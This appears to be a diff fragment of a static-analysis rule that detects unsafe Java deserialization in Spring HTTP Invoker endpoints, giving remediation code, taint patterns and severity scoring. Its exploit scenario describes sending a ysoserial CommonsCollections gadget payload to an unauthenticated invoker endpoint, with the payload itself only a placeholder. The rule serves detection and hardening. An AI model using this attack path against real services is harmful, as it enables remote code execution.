+             return exporter;
+         }
+
+         // Good: Spring REST controller
+         @RestController
+         @RequestMapping("/api/service")
+         public class MyServiceController {
+             @PostMapping("/method")
+             public ResponseEntity<Result> method(@RequestBody @Valid Request req) {
+                 return ResponseEntity.ok(myService.method(req));
+             }
+         }
+         ```
+      2. If HTTP Invoker must be kept, restrict access with Spring Security.
+      3. Implement ObjectInputFilter on the exporter:
+         ```java
+         exporter.setObjectInputFilter(info ->
+             ALLOWED_CLASSES.contains(info.serialClass().getName())
+                 ? Status.ALLOWED : Status.REJECTED
+         );
+         ```
+      4. Use gRPC or Spring WebFlux for inter-service communication.
+      5. Audit Spring configuration for all remoting endpoints.
+    references:
+      - "https://spring.io/blog/2016/01/28/this-week-in-spring-january-28th-2016"
+      - "https://docs.spring.io/spring-framework/docs/current/reference/html/integration.html#remoting-httpinvoker"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "HttpInvokerServiceExporter bean definition"
+        - "URL mapping to invoker endpoint"
+        - "No Spring Security on invoker endpoint"
+        - "No ObjectInputFilter on exporter"
+      taint_source_indicators:
+        - "HTTP POST body"
+        - "application/x-java-serialized-object content"
+        - "Spring DispatcherServlet"
+        - "Remote client invocation"
+      taint_sink_indicators:
+        - "HttpInvokerServiceExporter.handleRequest()"
+        - "RemoteInvocationSerializingExporter.doReadRemoteInvocation()"
+        - "ObjectInputStream within Spring remoting"
+      sanitization_patterns:
+        - "Spring Security authentication on endpoint"
+        - "ObjectInputFilter on exporter"
+        - "IP whitelist on invoker URL"
+        - "Network segmentation (internal only)"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (public_endpoint ? 1.5 : 0.8)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Spring application exposes an HTTP Invoker endpoint at /api/invoker
+        without authentication. The endpoint is configured via:
+        @Bean("/api/invoker")
+        public HttpInvokerServiceExporter exporter() { ... }
+        An attacker sends a POST request with Content-Type:
+        application/x-java-serialized-object containing a ysoserial
+        CommonsCollections payload. The HttpInvokerServiceExporter
+        deserializes the request body using ObjectInputStream, triggering
+        the gadget chain which executes the attacker's command. No valid
+        RemoteInvocation is needed; deserialization occurs before any
+        request validation.
+      example_payload: "POST /api/invoker HTTP/1.1\nContent-Type: application/x-java-serialized-object\n\n[ysoserial CommonsCollections1 payload bytes]"
+      attacker_objective: "Exploit Spring HTTP Invoker's Java serialization transport to achieve unauthenticated RCE via gadget chains"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-005"
+        - "DESER-JAVA-003"
